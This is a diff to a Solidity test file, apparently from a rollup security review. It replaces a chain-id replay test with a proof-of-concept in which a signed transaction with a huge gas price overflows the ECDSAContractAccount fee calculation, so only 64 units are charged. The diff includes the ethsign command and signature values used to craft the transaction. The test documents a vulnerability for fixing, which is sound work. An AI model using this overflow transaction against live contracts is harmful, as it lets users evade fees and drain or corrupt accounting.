@@ -161,19 +161,20 @@ contract StateTransiti1onerTest is DSTest {
         assertEq(impl, empty);
     }
 
-    // demonstrates wrong chainid replaying
-    // generate this tx by running `./sign 0xD521C744831cFa3ffe472d9F5F9398c9Ac806203`
-    function testChainIdReplay() public {
+    // demonstrates successful gas overflow in the ECDSAContractAccount
+    // generated with ./sign with the following modification:
+    // TX=$(ethsign tx --to "$1" --from "$FROM" --chain-id 420 --gas-price 0x346dc5d63886594af4f0d844d013a92a305532617c1bda5119ce075f6fd22  --passphrase-file optimistic --key-store secrets --nonce 1 --value 0 --gas-limit 20000)
+    function testGasOverflow() public {
         // This tx has chainid = 1.
 
         // struct EIP155Transaction
         uint256 nonce = 1;
-        uint256 gasPrice = 1;
-        uint256 gasLimit = 21000;
+        uint256 gasPrice = 0x346dc5d63886594af4f0d844d013a92a305532617c1bda5119ce075f6fd22;
+        uint256 gasLimit = 20000;
         address to = 0xD521C744831cFa3ffe472d9F5F9398c9Ac806203;
         uint256 value = 0;
         bytes memory data = "";
-        uint256 chainId = 1;
+        uint256 chainId = 420;
         bytes memory exampleTx = Lib_OVMCodec.encodeEIP155Transaction(
             Lib_OVMCodec.EIP155Transaction(
                 nonce,
@@ -210,14 +211,14 @@ contract StateTransiti1onerTest is DSTest {
                 exampleTx,
                 0,
                 1,
-                0xdd6242c54e6400af0acbe5c9f6e88c6da7abdeb6148ef0ad1f58dc51eb5fb863,
-                0x1a881c58541d6875cd797cc0b298481e10ed634c147b9b59c950de655cc15983
+                0x91c5fce61765ba44cbead9c49b353d82ac32c882ea20a42ae0214659a2606c57,
+                0x29378557ddf674f2d0520e1fec9ad91a4165170fab29d2c454e46f1d539f6115
             )
         );
 
         // --- POST STATE ---
-        assertEq(balanceOf(0xD521C744831cFa3ffe472d9F5F9398c9Ac806203), 25000 - gasLimit);
-        assertEq(balanceOf(address(0)), gasLimit);
+        assertEq(balanceOf(0xD521C744831cFa3ffe472d9F5F9398c9Ac806203), 25000 - 64);
+        assertEq(balanceOf(address(0)), 64);
     }
 
     // signing with 0xD521C744831cFa3ffe472d9F5F9398c9Ac806203
